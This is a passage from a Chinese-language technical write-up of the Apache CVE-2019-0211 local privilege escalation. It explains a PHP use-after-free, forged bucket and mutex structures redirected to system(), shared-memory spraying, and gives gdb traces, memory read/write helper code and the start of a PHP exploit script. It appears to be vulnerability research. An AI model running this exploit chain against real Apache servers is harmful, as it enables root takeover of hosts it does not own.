class="cs9FB05234">function get_aslr()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;global $p, $y;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$p = 0;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;$y = [new X(&#39;PT1S&#39;)];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;json_encode([1234 =&gt; &amp;$y]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;print(&quot;ADDRESS: 0x&quot; . dechex($p) . &quot;\n&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;return $p;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">get_aslr();</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这是</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">对象上的</span><span class="cs8926E06">UAF</span><span class="cs9C1B1871">：</span><span class="cs8926E06"> </span><span class="cs9C1B1871">我们</span><span class="cs8926E06">unset $y[0]</span><span class="cs9C1B1871">（</span><span class="cs8926E06">X</span><span class="cs9C1B1871">的一个实例），但它仍然可以通过</span><span class="cs8926E06">$this</span><span class="cs9C1B1871">使用。</span></p><h5 class="cs868C439D">
			<a name="uaf导致读写"><span class="cs4B51D5E4">UAF</span><span class="cs1C2E50E7">导致读</span><span class="cs4B51D5E4">/</span><span class="cs1C2E50E7">写</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">我们希望实现两件事：</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">读取内存以查找</span><span class="cs8926E06">all_buckets</span><span class="cs9C1B1871">的地址</span></li><li class="cs24C36B3"><span class="cs9C1B1871">编辑共享内存，修改</span><span class="cs8926E06">bucket</span><span class="cs9C1B1871">，添加我们自定义的恶意结构</span></li></ul>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">幸运的是，</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">的堆位于内存中的那两个之前。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">PHP</span><span class="cs9C1B1871">堆，</span><span class="cs8926E06">ap_scoreboard_image</span><span class="cs9C1B1871">，</span><span class="cs8926E06">all_buckets</span><span class="cs9C1B1871">的内存地址</span></p><p class="cs3A447A38"><span class="cs9FB05234">root@apaubuntu:~# cat /proc/6318/maps | grep libphp | grep rw-p</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">7f4a8f9f3000-7f4a8fa0a000 rw-p 00471000 08:02 542265 /usr/lib/apache2/modules/libphp7.2.so</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">(gdb) p *ap_scoreboard_image </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$14 = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;global = 0x7f4a9323e008, </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;parent = 0x7f4a9323e020, </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;servers = 0x55835eddea78</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(gdb) p all_buckets </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$15 = (prefork_child_bucket *) 0x7f4a9336b3f0</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">由于我们在</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">对象上触发</span><span class="cs8926E06">UAF</span><span class="cs9C1B1871">，因此该对象的任何属性也将是</span><span class="cs8926E06">UAF; </span><span class="cs9C1B1871">我们可以将这个</span><span class="cs8926E06">zend_object UAF</span><span class="cs9C1B1871">转换为</span><span class="cs8926E06">zend_string</span><span class="cs9C1B1871">。因为</span><span class="cs8926E06">zend_string</span><span class="cs9C1B1871">的结构非常有用：</span></p><p class="cs3A447A38"><span class="cs9FB05234">(gdb) ptype zend_string</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">type = struct _zend_string {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;zend_refcounted_h gc;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;zend_ulong h;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;size_t len;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;char val[1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">len</span><span class="cs9C1B1871">属性包含字符串的长度。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">通过递增它，我们可以在内存中进一步读写，从而访问我们感兴趣的两个内存区域</span><span class="cs8926E06">:</span><span class="cs9C1B1871">共享内存和</span><span class="cs8926E06">all_buckets</span><span class="cs9C1B1871">。</span></p><h5 class="cs868C439D">
			<a name="定位bucket-index-和-all_buckets"><span class="cs1C2E50E7">定位</span><span class="cs4B51D5E4">bucket index </span><span class="cs1C2E50E7">和</span><span class="cs4B51D5E4"> all_buckets</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">我们需要修改</span><span class="cs8926E06">ap_scoreboard_image-&gt;parent[worker_id]-&gt;bucket</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">parent</span><span class="cs9C1B1871">结构中的</span><span class="cs8926E06">bucket</span><span class="cs9C1B1871">。幸运的是，</span><span class="cs8926E06">parent</span><span class="cs9C1B1871">结构总是处于共享内存块的开始，因此很容易找到：</span></p><p class="cs3A447A38"><span class="cs98083A41">➜</span><span class="cs9FB05234"> &nbsp;/www curl 127.0.0.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">PID: 14380</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">7f8a19da9000-7f8a19dc1000 rw-s 00000000 00:04 61736 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/dev/zero (deleted)</span><span class="cs8926E06"><br/></span><span class="cs98083A41">➜</span><span class="cs9FB05234"> &nbsp;/www </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">(gdb) p &amp;ap_scoreboard_image-&gt;parent[0]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$1 = (process_score *) 0x7f8a19da9040</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(gdb) p &amp;ap_scoreboard_image-&gt;parent[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$2 = (process_score *) 0x7f8a19da9064</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(gdb) </span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">为了定位到</span><span class="cs8926E06">all_buckets,</span><span class="cs9C1B1871">我们可以利用我们对</span><span class="cs8926E06">prefork_child_bucket</span><span class="cs9C1B1871">结构的了解</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">prefork_child_bucket {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ap_pod_t *pod;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ap_listen_rec *listeners;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;apr_proc_mutex_t *mutex; &lt;--</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">apr_proc_mutex_t {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;apr_pool_t *pool;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;const apr_proc_mutex_unix_lock_methods_t *meth; &lt;--</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int curr_locked;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;char *fname;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">apr_proc_mutex_unix_lock_methods_t {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unsigned int flags;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;apr_status_t (*create)(apr_proc_mutex_t *, const char *);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;apr_status_t (*acquire)(apr_proc_mutex_t *);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;apr_status_t (*tryacquire)(apr_proc_mutex_t *);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;apr_status_t (*release)(apr_proc_mutex_t *);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;apr_status_t (*cleanup)(void *);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); &lt;--</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;apr_status_t (*perms_set)(apr_proc_mutex_t *, apr_fileperms_t, apr_uid_t, apr_gid_t);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;apr_lockmech_e mech;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;const char *name;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">all_buckets[0]-&gt;mutex </span><span class="cs9C1B1871">与</span><span class="cs8926E06"> all_buckets[0] </span><span class="cs9C1B1871">位于同一个内存区域中（我的是第一个</span><span class="cs8926E06">heap</span><span class="cs9C1B1871">内存区域中）。</span><span class="cs8926E06">apr_proc_mutex_unix_lock_methods_t</span><span class="cs9C1B1871">是一个静态结构，位于</span><span class="cs8926E06">libapr</span><span class="cs9C1B1871">的</span><span class="cs8926E06">.data</span><span class="cs9C1B1871">，因此</span><span class="cs8926E06">meth</span><span class="cs9C1B1871">指针指向</span><span class="cs8926E06">libapr</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">data</span><span class="cs9C1B1871">段中，且</span><span class="cs8926E06">apr_proc_mutex_unix_lock_methods_t</span><span class="cs9C1B1871">结构中的函数，位于</span><span class="cs8926E06">libapr</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">text</span><span class="cs9C1B1871">段中。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">由于我们可以通过</span><span class="cs8926E06">/proc/self/maps</span><span class="cs9C1B1871">来了解这些内存区域，我们可以遍历</span><span class="cs8926E06">Apache</span><span class="cs9C1B1871">内存中的每一个指针，找到一个匹配该结构的指针，这将是</span><span class="cs8926E06">all_buckets [0]</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注意，</span><span class="cs8926E06">all_buckets</span><span class="cs9C1B1871">的地址在每次正常重启时都会发生变化。这意味着当我们的漏洞触发时，</span><span class="cs8926E06">all_buckets</span><span class="cs9C1B1871">的地址将与我们找到的地址不同。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">必须考虑到这一点</span><span class="cs8926E06">; </span><span class="cs9C1B1871">我们稍后会解决该问题。</span></p><h4 class="cs868C439D">
			<a name="向共享内存中写入恶意prefork_child_bucket结构"><span class="cs6EDCDAE2">向共享内存中写入恶意</span><span class="csBF12A472">prefork_child_bucket</span><span class="cs6EDCDAE2">结构</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">任意函数调用的代码路径如下</span></p><p class="cs3A447A38"><span class="cs9FB05234">bucket_id = ap_scoreboard_image-&gt;parent[id]-&gt;bucket</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">my_bucket = all_buckets[bucket_id]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">mutex = &amp;my_bucket-&gt;mutex</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">apr_proc_mutex_child_init(mutex)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(*mutex)-&gt;meth-&gt;child_init(mutex, pool, fname)</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Apache/%ef%bc%88CVE-2019-0211%ef%bc%89Apache%20HTTP%20%e6%9c%8d%e5%8a%a1%e7%bb%84%e4%bb%b6%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="181" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">为了利用，我们使</span><span class="cs8926E06">(</span><span class="cs2F00A314">mutex)-&gt;meth-&gt;child_init</span><span class="csDFAC8B64">指向</span><span class="cs2F00A314">zend_object_std_dtor(zend_object</span><span class="cs8926E06"> object),</span><span class="cs9C1B1871">这产生以下链</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">mutex = &amp;my_bucket-&gt;mutex</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[object = mutex]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">zend_object_std_dtor(object)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ht = object-&gt;properties</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">zend_array_destroy(ht)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">zend_hash_destroy(ht)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">val = &amp;ht-&gt;arData[0]-&gt;val</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ht-&gt;pDestructor(val)</span></p><p class="cs40DD2BC9"><span class="cs8926E06">pDestructor </span><span class="cs9C1B1871">使其指向</span><span class="cs8926E06">system</span><span class="cs9C1B1871">函数，</span><span class="cs8926E06">&amp;ht-&gt;arData[0]-&gt;val</span><span class="cs9C1B1871">为</span><span class="cs8926E06">system</span><span class="cs9C1B1871">函数的字符串。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Apache/%ef%bc%88CVE-2019-0211%ef%bc%89Apache%20HTTP%20%e6%9c%8d%e5%8a%a1%e7%bb%84%e4%bb%b6%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="158" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如我们所见，两个最左边的两个结构是可以叠加的</span><span class="cs8926E06">(prefork_child_bucket,zend_object</span><span class="cs9C1B1871">结构</span><span class="cs8926E06">)</span><span class="cs9C1B1871">。</span></p><h4 class="cs868C439D">
			<a name="使all_buckets-bucket指向恶意构造的结构"><span class="cs6EDCDAE2">使</span><span class="csBF12A472">all_buckets [bucket]</span><span class="cs6EDCDAE2">指向恶意构造的结构</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">由于</span><span class="cs8926E06">all_buckets</span><span class="cs9C1B1871">地址在每次优雅重启之后会改变，我们需要对其进行改进，有两种改进：喷射共享内存和使用每个</span><span class="cs8926E06">process_score</span><span class="cs9C1B1871">结构。</span></p><h5 class="cs868C439D">
			<a name="喷射共享内存"><span class="cs1C2E50E7">喷射共享内存</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">如果</span><span class="cs8926E06">all_buckets</span><span class="cs9C1B1871">的新地址离旧地址不远，</span><span class="cs8926E06">my_bucket</span><span class="cs9C1B1871">将会大概指向我们的结构。因此，我们可以将其全部喷射在共享内存的未使用部分上，而不是将我们的</span><span class="cs8926E06">prefork_child_bucket</span><span class="cs9C1B1871">结构放在共享内存的精确位置。但是问题是，该结构也用于作为</span><span class="cs8926E06">zend_object</span><span class="cs9C1B1871">结构，因此它的大小为（</span><span class="cs8926E06">5 * 8</span><span class="cs9C1B1871">）</span><span class="cs8926E06">40</span><span class="cs9C1B1871">个字节以包含</span><span class="cs8926E06">zend_object.properties</span><span class="cs9C1B1871">字段。在共享内存中，喷射该混合结构，对我们没有帮助。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">为了解决该问题，我们叠加</span><span class="cs8926E06">apr_proc_mutex_t</span><span class="cs9C1B1871">和</span><span class="cs8926E06">zend_array</span><span class="cs9C1B1871">结构，并将其地址喷洒在共享内存的其余部分。影响将是</span><span class="cs8926E06">prefork_child_bucket.mutex</span><span class="cs9C1B1871">和</span><span class="cs8926E06">zend_object.properties</span><span class="cs9C1B1871">指向同一地址。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">现在，如果</span><span class="cs8926E06">all_bucket</span><span class="cs9C1B1871">重新定位没有远离其原始地址，</span><span class="cs8926E06">my_bucket</span><span class="cs9C1B1871">将位于喷射区域。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Apache/%ef%bc%88CVE-2019-0211%ef%bc%89Apache%20HTTP%20%e6%9c%8d%e5%8a%a1%e7%bb%84%e4%bb%b6%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="370" alt="" style="border-width:0px;" /></span></p><h5 class="cs868C439D">
			<a name="使用每个process_score结构"><span class="cs1C2E50E7">使用每个</span><span class="cs4B51D5E4">process_score</span><span class="cs1C2E50E7">结构</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">每个</span><span class="cs8926E06">Apache</span><span class="cs9C1B1871">工作进程都有一个关联的</span><span class="cs8926E06">process_score</span><span class="cs9C1B1871">结构，并且每一个都有一个</span><span class="cs8926E06">bucket</span><span class="cs9C1B1871">索引。我们可以改变它们中的每一个，而不是改变一个</span><span class="cs8926E06">process_score.bucket</span><span class="cs9C1B1871">值，以使它们覆盖内存的另一部分。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">例如：</span></p><p class="cs3A447A38"><span class="cs9FB05234">ap_scoreboard_image-&gt;parent[0]-&gt;bucket = -10000 -&gt; 0x7faabbcc00 &lt;= all_buckets &lt;= 0x7faabbdd00</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ap_scoreboard_image-&gt;parent[1]-&gt;bucket = -20000 -&gt; 0x7faabbdd00 &lt;= all_buckets &lt;= 0x7faabbff00</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ap_scoreboard_image-&gt;parent[2]-&gt;bucket = -30000 -&gt; 0x7faabbff00 &lt;= all_buckets &lt;= 0x7faabc0000</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这样一来，我们的成功率就是原始成功率乘以</span><span class="cs8926E06">Apache Worker</span><span class="cs9C1B1871">的数量。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">作者通过在共享内存中查找</span><span class="cs8926E06">worker process</span><span class="cs9C1B1871">的</span><span class="cs8926E06">PID</span><span class="cs9C1B1871">从而定位到每个</span><span class="cs8926E06">process_score</span><span class="cs9C1B1871">结构，并利用被</span><span class="cs8926E06">UAF</span><span class="cs9C1B1871">漏洞修改过的字符串结构对</span><span class="cs8926E06">bucket</span><span class="cs9C1B1871">字段值进行修改。</span></p><h4 class="cs868C439D">
			<a name="成功率"><span class="cs6EDCDAE2">成功率</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">不同的</span><span class="cs8926E06">Apache</span><span class="cs9C1B1871">服务具有不同数量的工作进程。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">拥有更多的工作进程意味着我们可以在更少的内存上喷射互斥锁的地址，但这也意味着我们可以为</span><span class="cs8926E06">all_buckets</span><span class="cs9C1B1871">指定更多的索引。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">这意味着拥有更多工作进程可以提高我们的成功率。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">在测试</span><span class="cs8926E06">Apache</span><span class="cs9C1B1871">服务器上尝试了</span><span class="cs8926E06">4</span><span class="cs9C1B1871">个工作进程（默认）后，成功率大约为</span><span class="cs8926E06">80</span><span class="cs9C1B1871">％。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">随着更多工作进程，成功率跃升至</span><span class="cs8926E06">100</span><span class="cs9C1B1871">％左右。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">同样，如果漏洞利用失败，它可以在第二天重新启动，因为</span><span class="cs8926E06">Apache</span><span class="cs9C1B1871">仍将正常重启。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">然而，</span><span class="cs8926E06">Apache</span><span class="cs9C1B1871">的</span><span class="cs8926E06">error.log</span><span class="cs9C1B1871">将包含有关其工作进程段错误的通知。</span></p><h4 class="cs868C439D">
			<a name="利用php扩展模块体验任意函数执行"><span class="cs6EDCDAE2">利用</span><span class="csBF12A472">PHP</span><span class="cs6EDCDAE2">扩展模块体验任意函数执行</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">为了更好的理解该漏洞，我们用</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">扩展，来模拟</span><span class="cs8926E06">PHP UAF</span><span class="cs9C1B1871">，以达到任意地址读写。</span></p><h4 class="cs868C439D">
			<a name="环境"><span class="cs6EDCDAE2">环境</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">操作系统</span><span class="cs8926E06">:CentOS 7 x64</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Apache</span><span class="cs9C1B1871">版本</span><span class="cs8926E06">:Apache/2.4.38 (Unix)</span></p><p class="cs40DD2BC9"><span class="cs8926E06">PHP</span><span class="cs9C1B1871">版本</span><span class="cs8926E06">:PHP 7.3.3</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Apache </span><span class="cs9C1B1871">编译选项</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">./configure --prefix=/usr/local/httpd/ \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--sysconfdir=/etc/httpd/ \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-include-apr \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--disable-userdir \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--enable-headers \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-mpm=prefork \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--enable-modules=most \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--enable-so \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--enable-deflate \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--enable-defate=shared \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--enable-expires-shared \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--enable-rewrite=shared \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--enable-static-support \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-apr=/usr/local/apr/ \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-apr-util=/usr/local/apr-util/bin \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-ssl \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-z </span></p><p class="cs40DD2BC9"><span class="cs8926E06">PHP</span><span class="cs9C1B1871">编译选项</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">./configure --prefix=/usr/local/php/ \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-config-file-path=/usr/local/php/etc/ \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-apxs2=/usr/local/httpd/bin/apxs \ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--enable-fpm \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-zlib \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-libxml-dir \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--enable-sockets \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-curl \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-jpeg-dir \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-png-dir \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-gd \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-iconv-dir \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-freetype-dir \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--enable-gd-native-ttf \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-xmlrpc \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-openssl \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-mhash \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-mcrypt \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--with-pear \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--enable-mbstring \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--enable-sysvshm \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--enable-zip \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--disable-fileinfo </span></p><p class="cs40DD2BC9"><span class="cs8926E06">PHP</span><span class="cs9C1B1871">扩展</span></p><p class="cs3A447A38"><span class="cs9FB05234">[root@bogon php-extension]# cat read_mem.c </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;stdio.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;stdint.h&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">long read_mem(long addr)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return (unsigned long)(*((uint8_t*)(addr)));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[root@bogon php-extension]# cat write_mem.c </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;stdio.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;stdint.h&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">void write_mem(long addr,long data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;*((uint8_t*)addr) = data;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[root@bogon php-extension]# </span></p><h4 class="cs868C439D">
			<a name="问题"><span class="cs6EDCDAE2">问题</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">我在</span><span class="cs8926E06">Apache 2.4.38 </span><span class="cs9C1B1871">与</span><span class="cs8926E06"> Apache 2.4.25</span><span class="cs9C1B1871">中，测试发现</span><span class="cs8926E06">all_buckets</span><span class="cs9C1B1871">的地址与共享内存的地址之间的差值，远远不是一个</span><span class="cs8926E06">4</span><span class="cs9C1B1871">字节能表示的（</span><span class="cs8926E06">bucket</span><span class="cs9C1B1871">索引</span><span class="cs8926E06">4</span><span class="cs9C1B1871">字节）。所以在我的演示中，需要通过</span><span class="cs8926E06">gdb</span><span class="cs9C1B1871">来修改</span></p><p class="cs3A447A38"><span class="cs9FB05234">my_bucket = &amp;all_buckets[bucket];//prefork.c:685</span></p><p class="cs40DD2BC9"><span class="cs8926E06">my_bucket</span><span class="cs9C1B1871">的值，来模拟修改</span><span class="cs8926E06">bucket</span><span class="cs9C1B1871">，使其指向恶意的</span><span class="cs8926E06">prefork_child_bucket</span><span class="cs9C1B1871">结构。</span></p><h4 class="cs868C439D">
			<a name="php利用代码"><span class="csBF12A472">PHP</span><span class="cs6EDCDAE2">利用代码</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function read_mem_dword($addr)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ret = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($j = 0;$j&lt;4;$j++){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ret += read_mem($addr+$j) * pow(256,$j);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $ret;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function read_mem_qword($addr)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ret = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($j = 0;$j&lt;8;$j++){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ret += read_mem($addr+$j) 